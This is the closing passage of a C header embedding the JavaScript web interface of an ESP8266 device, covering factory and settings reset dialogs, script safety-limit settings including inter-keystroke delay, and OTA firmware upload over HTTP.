                'Device will reboot to default WiFi network.\n\n' +
                'Continue?'
            );

            if (!confirmed) return;

            const statusEl = document.getElementById('reset-status');
            statusEl.textContent = '⚙️ Performing settings reset...';
            statusEl.style.color = '#ffa726';

            // Send settings reset command via WebSocket
            ws.send('RESET_SETTINGS\r\n');

            showToast('Settings reset initiated...', 'warning');

            setTimeout(() => {
                closeSettingsModal();
                appendOutput('\n=== SETTINGS RESET IN PROGRESS ===\n', 'system-message');
                appendOutput('Device rebooting with default WiFi credentials...\n', 'system-message');
            }, 1500);
        }

        function confirmFullFactoryReset() {
            if (!isConnected) {
                showToast('Not connected to device', 'error');
                return;
            }

            const confirmed = confirm(
                '🏭 FULL FACTORY RESET\n\n' +
                '⚠️ WARNING: THIS CANNOT BE UNDONE!\n\n' +
                'This will:\n' +
                '• Perform settings reset (WiFi, recordings, OTA files)\n' +
                '• Restore factory firmware backup (if saved)\n' +
                '• Revert to original firmware version\n\n' +
                'If no factory firmware backup exists, only settings will be reset.\n\n' +
                'Are you ABSOLUTELY SURE?'
            );

            if (!confirmed) return;

            // Double confirmation for destructive action
            const doubleConfirm = confirm(
                '⚠️ FINAL CONFIRMATION ⚠️\n\n' +
                'This will restore factory firmware and cannot be undone.\n\n' +
                'Click OK to proceed with FULL FACTORY RESET.'
            );

            if (!doubleConfirm) return;

            const statusEl = document.getElementById('reset-status');
            statusEl.textContent = '🏭 Performing full factory reset...';
            statusEl.style.color = '#ef5350';

            // Send full reset command via WebSocket
            ws.send('RESET_FULL\r\n');

            showToast('Full factory reset initiated...', 'error');

            setTimeout(() => {
                closeSettingsModal();
                appendOutput('\n=== FULL FACTORY RESET IN PROGRESS ===\n', 'error-message');
                appendOutput('Restoring factory firmware backup...\n', 'error-message');
                appendOutput('Device will reboot to recovery mode.\n', 'error-message');
            }, 1500);
        }

        // ========== SCRIPT SETTINGS FUNCTIONS ==========
        function openScriptSettingsModal() {
            console.log('[SETTINGS] === MODAL OPENED ===');
            // Request current settings from device
            if (isConnected && ws && ws.readyState === WebSocket.OPEN) {
                console.log('[SETTINGS] Requesting current settings from ESP8266');
                ws.send('SCRIPT_SETTINGS_GET\r\n');
            } else {
                console.error('[SETTINGS] Cannot request settings - not connected');
            }
            document.getElementById('script-settings-modal-overlay').classList.add('show');
            document.getElementById('script-settings-status').textContent = '';
        }

        function closeScriptSettingsModal() {
            console.log('[SETTINGS] === MODAL CLOSED ===');
            document.getElementById('script-settings-modal-overlay').classList.remove('show');
        }

        function saveScriptSettings() {
            console.log('[SETTINGS] === SAVE BUTTON CLICKED ===');
            const settings = {
                maxVariables: parseInt(document.getElementById('limit-max-variables').value),
                maxConstants: parseInt(document.getElementById('limit-max-constants').value),
                maxFunctions: parseInt(document.getElementById('limit-max-functions').value),
                maxLoopIterations: parseInt(document.getElementById('limit-max-loop-iterations').value),
                maxCallDepth: parseInt(document.getElementById('limit-max-call-depth').value),
                maxLineLength: parseInt(document.getElementById('limit-max-line-length').value),
                maxStringLength: parseInt(document.getElementById('limit-max-string-length').value),
                maxScriptLines: parseInt(document.getElementById('limit-max-script-lines').value),
                maxExecutionTime: parseInt(document.getElementById('limit-max-execution-time').value) * 1000,  // Convert seconds to ms
                defaultInterKeystrokeDelay: parseInt(document.getElementById('limit-default-inter-keystroke-delay').value)
            };

            console.log('[SETTINGS] Settings to save:', settings);

            // Validate all fields
            for (const [key, value] of Object.entries(settings)) {
                // defaultInterKeystrokeDelay can be 0, others must be >= 1
                const minValue = (key === 'defaultInterKeystrokeDelay') ? 0 : 1;
                if (isNaN(value) || value < minValue) {
                    console.error('[SETTINGS] Validation failed for', key, ':', value);
                    showToast('Invalid value for ' + key, 'error');
                    return;
                }
            }

            if (!isConnected || !ws || ws.readyState !== WebSocket.OPEN) {
                console.error('[SETTINGS] Not connected to device');
                showToast('Not connected to device', 'error');
                return;
            }

            const statusEl = document.getElementById('script-settings-status');
            statusEl.textContent = '💾 Saving settings...';
            statusEl.style.color = '#90caf9';

            const jsonSettings = JSON.stringify(settings);
            console.log('[SETTINGS] Sending to ESP8266:', 'SCRIPT_SETTINGS_SET:' + jsonSettings);
            ws.send('SCRIPT_SETTINGS_SET:' + jsonSettings + '\r\n');
        }

        function resetScriptSettings() {
            if (!isConnected || !ws || ws.readyState !== WebSocket.OPEN) {
                showToast('Not connected to device', 'error');
                return;
            }

            const confirmed = confirm(
                '🔔 Reset Script Settings\n\n' +
                'This will restore all safety limits to their default values.\n\n' +
                'Continue?'
            );

            if (!confirmed) return;

            const statusEl = document.getElementById('script-settings-status');
            statusEl.textContent = '🔔 Resetting to defaults...';
            statusEl.style.color = '#ffa726';

            ws.send('SCRIPT_SETTINGS_RESET\r\n');
        }

        function updateScriptSettingsUI(settings) {
            console.log('[SETTINGS] === UPDATING UI WITH SETTINGS ===');
            console.log('[SETTINGS] Received settings:', settings);
            // Use !== undefined instead of || to allow 0 as a valid value
            document.getElementById('limit-max-variables').value = settings.maxVariables !== undefined ? settings.maxVariables : 50;
            document.getElementById('limit-max-constants').value = settings.maxConstants !== undefined ? settings.maxConstants : 30;
            document.getElementById('limit-max-functions').value = settings.maxFunctions !== undefined ? settings.maxFunctions : 10;
            document.getElementById('limit-max-loop-iterations').value = settings.maxLoopIterations !== undefined ? settings.maxLoopIterations : 10000;
            document.getElementById('limit-max-call-depth').value = settings.maxCallDepth !== undefined ? settings.maxCallDepth : 5;
            document.getElementById('limit-max-line-length').value = settings.maxLineLength !== undefined ? settings.maxLineLength : 256;
            document.getElementById('limit-max-string-length').value = settings.maxStringLength !== undefined ? settings.maxStringLength : 512;
            document.getElementById('limit-max-script-lines').value = settings.maxScriptLines !== undefined ? settings.maxScriptLines : 1000;
            document.getElementById('limit-max-execution-time').value = (settings.maxExecutionTime !== undefined ? settings.maxExecutionTime : 300000) / 1000;  // Convert ms to seconds
            document.getElementById('limit-default-inter-keystroke-delay').value = settings.defaultInterKeystrokeDelay !== undefined ? settings.defaultInterKeystrokeDelay : 10;
            console.log('[SETTINGS] UI updated with maxVariables:', document.getElementById('limit-max-variables').value);
            console.log('[SETTINGS] UI updated with defaultInterKeystrokeDelay:', document.getElementById('limit-default-inter-keystroke-delay').value);
        }

        // Add modal click-outside-to-close handler
        document.addEventListener('DOMContentLoaded', function() {
            const scriptSettingsModal = document.getElementById('script-settings-modal-overlay');
            if (scriptSettingsModal) {
                scriptSettingsModal.addEventListener('click', function(e) {
                    if (e.target === this) closeScriptSettingsModal();
                });
            }

            // Setup serial monitor event listeners
            setupSerialMonitorListeners();
        });

        function handleFileSelect(file) {
            if (!file) return;
            if (!file.name.toLowerCase().endsWith('.bin')) {
                showToast('Please select a .bin file', 'error');
                return;
            }
            if (file.size > 1024 * 1024) {
                showToast('File too large (max 1MB)', 'error');
                return;
            }
            selectedFile = file;
            document.getElementById('filename').textContent = file.name;
            document.getElementById('filesize').textContent = formatBytes(file.size);
            document.getElementById('file-info').style.display = 'block';
            document.getElementById('upload-btn').disabled = false;
        }

        function formatBytes(bytes) {
            if (bytes < 1024) return bytes + ' B';
            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
            return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
        }

        function startOTAUpload() {
            if (!selectedFile) {
                showToast('No file selected', 'error');
                return;
            }

            if (!isConnected) {
                showToast('Not connected to device', 'error');
                return;
            }

            document.getElementById('upload-btn').disabled = true;
            document.getElementById('progress-container').style.display = 'block';
            document.getElementById('progress-bar').style.width = '0%';
            document.getElementById('progress-text').textContent = '0%';
            document.getElementById('ota-status').textContent = 'Uploading firmware...';
            document.getElementById('ota-status').style.color = '#90caf9';

            const formData = new FormData();
            formData.append('firmware', selectedFile);

            const xhr = new XMLHttpRequest();
            otaLastProgress = 0; // Reset global progress tracker

            xhr.upload.addEventListener('progress', function(e) {
                if (e.lengthComputable) {
                    const percent = Math.round((e.loaded / e.total) * 100);
                    // Only update if progress moved forward (prevent backward jumps)
                    if (percent > otaLastProgress) {
                        otaLastProgress = percent;
                        document.getElementById('progress-bar').style.width = percent + '%';
                        document.getElementById('progress-text').textContent = percent + '%';
                    }
                }
            });

            xhr.addEventListener('load', function() {
                if (xhr.status === 200) {
                    // Upload successful - device will reboot soon
                    // Don't wait for WebSocket - it will disconnect when device reboots
                    document.getElementById('progress-bar').style.width = '100%';
                    document.getElementById('progress-text').textContent = '100%';
                    document.getElementById('ota-status').textContent = '✓ Upload complete! Flashing firmware...';
                    document.getElementById('ota-status').style.color = '#66bb6a';
                    showToast('Firmware flashing...', 'success');
                    showOTACountdown();
                } else {
                    document.getElementById('ota-status').textContent = '✗ Upload failed: ' + xhr.statusText;
                    document.getElementById('ota-status').style.color = '#ef5350';
                    showToast('Upload failed', 'error');
                    document.getElementById('upload-btn').disabled = false;
                }
            });

            xhr.addEventListener('error', function() {
                // Check if upload completed before error (device rebooted)
                const progressWidth = otaLastProgress;

                // If we're past 95%, it's likely the device rebooted (EXPECTED)
                if (progressWidth >= 95) {
                    document.getElementById('progress-bar').style.width = '100%';
                    document.getElementById('progress-text').textContent = '100%';
                    document.getElementById('ota-status').textContent = '✓ Upload complete! Flashing firmware...';
                    document.getElementById('ota-status').style.color = '#66bb6a';
                    showToast('Firmware flashing...', 'success');
                    showOTACountdown();
                } else {
                    // Real error - upload failed mid-way
                    document.getElementById('ota-status').textContent = '✗ Network error at ' + progressWidth + '%';
                    document.getElementById('ota-status').style.color = '#ef5350';
                    showToast('Upload failed at ' + progressWidth + '%', 'error');
                    document.getElementById('upload-btn').disabled = false;
                }
            });

            xhr.open('POST', '/update', true);
            xhr.send(formData);
        }

        function formatTime(seconds) {
            if (seconds < 60) return Math.round(seconds) + 's';
            const minutes = Math.floor(seconds / 60);
            const secs = Math.round(seconds % 60);
            return minutes + 'm ' + secs + 's';
        }

        // ========== INITIALIZATION ==========
        connectWebSocket();
        fetchVersion();

        // Set initial auto-scroll button state
        const autoscrollIcon = document.getElementById('autoscroll-btn-icon');
        if (autoscrollIcon && autoScroll) {
            autoscrollIcon.classList.add('active');
        }

        document.addEventListener('visibilitychange', function() {
            isPageVisible = !document.hidden;
            if (isPageVisible) {
                reconnectAttempts = 0;
                if (!isConnected || !ws || ws.readyState !== WebSocket.OPEN) {
                    if (reconnectInterval) {
                        clearInterval(reconnectInterval);
                        reconnectInterval = null;
                    }
                    setTimeout(() => {
                        if (isPageVisible) {
                            connectWebSocket();
                        }
                    }, 1000);
                }
            } else {
                if (reconnectInterval) {
                    clearInterval(reconnectInterval);
                    reconnectInterval = null;
                }
            }
        });

        window.addEventListener('beforeunload', function() {
            if (reconnectInterval) {
                clearInterval(reconnectInterval);
                reconnectInterval = null;
            }
            if (ws) {
                ws.close();
            }
        });

        let lastTouchEnd = 0;
        document.addEventListener('touchend', function(event) {
            const now = Date.now();
            if (now - lastTouchEnd <= 300) {
                event.preventDefault();
            }
            lastTouchEnd = now;
        }, false);

        window.addEventListener('resize', function() {
            if (trackpadCtx) {
                const canvas = document.getElementById('trackpad');
                canvas.width = canvas.offsetWidth;
                canvas.height = canvas.offsetHeight;
            }
        });
    </script>
</body>
</html>
)rawliteral";

#endif // WEBPAGE_H